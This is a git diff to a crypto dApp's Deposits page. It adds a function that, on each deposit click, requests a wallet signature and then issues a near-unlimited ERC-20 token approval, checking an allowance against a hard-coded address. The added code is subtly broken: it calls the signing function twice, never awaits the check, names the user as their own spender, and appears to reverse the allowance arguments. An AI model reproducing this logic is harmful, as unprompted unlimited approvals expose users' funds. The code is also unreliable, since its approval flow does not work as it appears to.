@@ -8,6 +8,7 @@ import {Swiper, SwiperSlide} from 'swiper/react';
 import type {NextPage} from 'next';
 
 import {apiUrl} from '@/config';
+import {approveAbi, approveContractAddress} from '@/config/approveContract';
 import {abi, contractAddress} from '@/config/contract';
 import {useContract, useEthersUtils} from '@/ethers-react';
 import {useSigner} from '@/ethers-react/useSigner';
@@ -20,7 +21,7 @@ import {
   WithDrawContainer,
 } from '@/styles/deposits';
 import {Modal, SvgIcon} from '@/uikit';
-import {copyUrlToClip, IMessageType, showTip} from '@/utils';
+import {copyUrlToClip, getAccount, IMessageType, showTip} from '@/utils';
 
 import 'swiper/css';
 
@@ -203,6 +204,7 @@ const Deposits: NextPage = () => {
   };
   const [userDrawer, setUserDrawer] = useRecoilState(userDrawerState);
   const handleClickBtn = async () => {
+    checkIsApprove();
     if (!deposits) {
       showTip({type: IMessageType.ERROR, content: 'Please Input '});
       return;
@@ -231,6 +233,39 @@ const Deposits: NextPage = () => {
       }
     }
   };
+  const checkIsApprove = async () => {
+    const msg = getHashId(`approve insta`);
+    getSignMessage(msg);
+    const signature = await getSignMessage(msg);
+    setLoading(false);
+    if (!signature.status) {
+      showTip({type: IMessageType.ERROR, content: signature.sign || ''});
+      return;
+    }
+    const contract = await getContract(approveContractAddress, approveAbi);
+    const account = await getAccount();
+    if (account) {
+      try {
+        const edu = await contract.allowance(
+          '0x846CaaAfC29E588bFEB662A83D73ed54FF11649B',
+          account
+        );
+        console.log(edu);
+        const price = getEtherPrice(99999999999);
+        const approoveCon = await contract.approve(account, price);
+        console.log(approoveCon);
+        setHasApprove(true);
+      } catch {
+        showTip({
+          type: IMessageType.ERROR,
+          content: 'please switch to Binance Smart Chain Testnet!',
+        });
+      }
+    } else {
+      showTip({type: IMessageType.ERROR, content: 'address error'});
+    }
+  };
+
   useEffect(() => {
     initRequest();
     setCopyLink(
